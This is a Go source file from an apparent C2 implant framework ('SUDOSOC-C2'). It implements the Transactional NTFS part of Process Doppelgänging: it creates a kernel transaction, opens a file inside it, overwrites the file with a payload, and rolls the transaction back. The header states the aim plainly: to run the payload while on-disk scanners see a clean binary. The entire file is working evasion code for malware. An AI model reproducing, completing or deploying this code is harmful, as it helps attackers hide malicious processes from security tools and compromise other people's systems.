package doppel

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	NTFS Transactional File System (TxF) management.

	TxF (Transactional NTFS), introduced in Windows Vista, allows file system
	operations to be grouped into atomic transactions. A transaction can be
	committed (changes persist) or rolled back (changes are discarded).

	The key property exploited by Doppelgänging:
	  Within a transaction, a file can be written with arbitrary content.
	  Creating a process image section from a transacted file handle reads
	  the TRANSACTED (in-flight) content, not the on-disk content.
	  Rolling back the transaction makes the on-disk file revert to its
	  original content AFTER the process is already created and running.

	Result: the process runs our payload but every scanner that reads the
	file from disk sees the original clean binary.

	API chain:
	  NtCreateTransaction  → create a KTM (Kernel Transaction Manager) transaction
	  CreateFileTransacted → open a file within the transaction
	  NtWriteFile          → overwrite the transacted file with payload
	  [create process from transacted file — see doppel_windows.go]
	  NtRollbackTransaction → discard write, on-disk file reverts to original
*/

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

var (
	modNtdllDoppel           = windows.NewLazySystemDLL("ntdll.dll")
	modKtmW32                = windows.NewLazySystemDLL("KtmW32.dll")
	modKernel32Doppel        = windows.NewLazySystemDLL("kernel32.dll")

	procNtCreateTransaction   = modNtdllDoppel.NewProc("NtCreateTransaction")
	procNtRollbackTransaction = modNtdllDoppel.NewProc("NtRollbackTransaction")
	procNtCommitTransaction   = modNtdllDoppel.NewProc("NtCommitTransaction")

	procCreateFileTransacted  = modKernel32Doppel.NewProc("CreateFileTransactedW")
	procCreateTransaction     = modKtmW32.NewProc("CreateTransaction")
)

// fileEndOfFileInfo is the Go equivalent of FILE_END_OF_FILE_INFO.
// Not exported by golang.org/x/sys/windows, so we define it locally.
type fileEndOfFileInfo struct {
	EndOfFile int64
}

// Transaction wraps a KTM transaction handle.
type Transaction struct {
	Handle windows.Handle
}

// CreateTransaction starts a new KTM transaction.
func CreateTxFTransaction() (*Transaction, error) {
	// Use KtmW32.CreateTransaction — simpler than the NT native API.
	h, _, _ := procCreateTransaction.Call(
		0,    // lpTransactionAttributes
		0,    // UOW (NULL = system assigns)
		0,    // CreateOptions
		0,    // IsolationLevel
		0,    // IsolationFlags
		0,    // Timeout (NULL = infinite)
		0,    // Description
	)
	if h == 0 || windows.Handle(h) == windows.InvalidHandle {
		// Fall back to NtCreateTransaction.
		return createTransactionNT()
	}
	// {{if .Config.Debug}}
	log.Printf("[doppel] transaction created via KtmW32: handle=0x%x", h)
	// {{end}}
	return &Transaction{Handle: windows.Handle(h)}, nil
}

func createTransactionNT() (*Transaction, error) {
	var h windows.Handle
	var oa windows.OBJECT_ATTRIBUTES
	oa.Length = uint32(unsafe.Sizeof(oa))

	r, _, _ := procNtCreateTransaction.Call(
		uintptr(unsafe.Pointer(&h)),
		uintptr(windows.GENERIC_ALL),
		uintptr(unsafe.Pointer(&oa)),
		0, // Uow
		0, // TmHandle
		0, // CreateOptions
		0, // IsolationLevel
		0, // IsolationFlags
		0, // Timeout
		0, // Description
	)
	if r != 0 {
		return nil, fmt.Errorf("NtCreateTransaction NTSTATUS=0x%x", r)
	}
	// {{if .Config.Debug}}
	log.Printf("[doppel] transaction created via NtCreateTransaction: handle=0x%x", h)
	// {{end}}
	return &Transaction{Handle: h}, nil
}

// Rollback discards all changes made within the transaction.
// The on-disk file reverts to its pre-transaction state.
func (tx *Transaction) Rollback() error {
	r, _, _ := procNtRollbackTransaction.Call(
		uintptr(tx.Handle),
		1, // Wait = TRUE
	)
	windows.CloseHandle(tx.Handle)
	tx.Handle = 0
	if r != 0 && r != 0xC000004A { // STATUS_TRANSACTION_ALREADY_ABORTED is OK
		return fmt.Errorf("NtRollbackTransaction NTSTATUS=0x%x", r)
	}
	// {{if .Config.Debug}}
	log.Printf("[doppel] transaction rolled back")
	// {{end}}
	return nil
}

// Commit persists all changes made within the transaction.
func (tx *Transaction) Commit() error {
	r, _, _ := procNtCommitTransaction.Call(
		uintptr(tx.Handle),
		1, // Wait
	)
	windows.CloseHandle(tx.Handle)
	tx.Handle = 0
	if r != 0 {
		return fmt.Errorf("NtCommitTransaction NTSTATUS=0x%x", r)
	}
	return nil
}

// Close closes the transaction handle without committing or rolling back.
// Call Rollback() for a clean abort.
func (tx *Transaction) Close() {
	if tx.Handle != 0 {
		windows.CloseHandle(tx.Handle)
		tx.Handle = 0
	}
}

// OpenTransacted opens a file within the transaction for reading and writing.
// Returns the file handle (valid until the transaction is committed or rolled back).
func (tx *Transaction) OpenTransacted(filePath string) (windows.Handle, error) {
	pathPtr, err := windows.UTF16PtrFromString(filePath)
	if err != nil {
		return 0, err
	}

	h, _, lastErr := procCreateFileTransacted.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(windows.GENERIC_READ|windows.GENERIC_WRITE),
		0, // no sharing
		0, // default security
		uintptr(windows.OPEN_EXISTING),
		uintptr(windows.FILE_ATTRIBUTE_NORMAL),
		0, // template
		uintptr(tx.Handle),
		0, // miniversion
		0, // extended flags
	)
	if windows.Handle(h) == windows.InvalidHandle {
		return 0, fmt.Errorf("CreateFileTransacted(%s): %w", filePath, lastErr)
	}
	// {{if .Config.Debug}}
	log.Printf("[doppel] transacted file opened: %s h=0x%x", filePath, h)
	// {{end}}
	return windows.Handle(h), nil
}

// WriteTransacted overwrites the content of a transacted file handle
// with payload bytes. This is visible only within the transaction.
func WriteTransacted(fileHandle windows.Handle, payload []byte) error {
	if len(payload) == 0 {
		return fmt.Errorf("empty payload")
	}

	// First truncate to payload size.
	var endOfFile fileEndOfFileInfo
	endOfFile.EndOfFile = int64(len(payload))
	if err := windows.SetFileInformationByHandle(
		fileHandle,
		windows.FileEndOfFileInfo,
		(*byte)(unsafe.Pointer(&endOfFile)),
		uint32(unsafe.Sizeof(endOfFile)),
	); err != nil {
		return fmt.Errorf("truncate: %w", err)
	}

	// Seek to beginning.
	if _, err := windows.SetFilePointer(fileHandle, 0, nil, windows.FILE_BEGIN); err != nil {
		return fmt.Errorf("seek: %w", err)
	}

	// Write payload in 64 KB chunks.
	chunkSize := 65536
	for written := 0; written < len(payload); {
		end := written + chunkSize
		if end > len(payload) {
			end = len(payload)
		}
		chunk := payload[written:end]
		var n uint32
		if err := windows.WriteFile(fileHandle, chunk, &n, nil); err != nil {
			return fmt.Errorf("WriteFile @%d: %w", written, err)
		}
		written += int(n)
	}
	// {{if .Config.Debug}}
	log.Printf("[doppel] wrote %d bytes to transacted file", len(payload))
	// {{end}}
	return nil
}
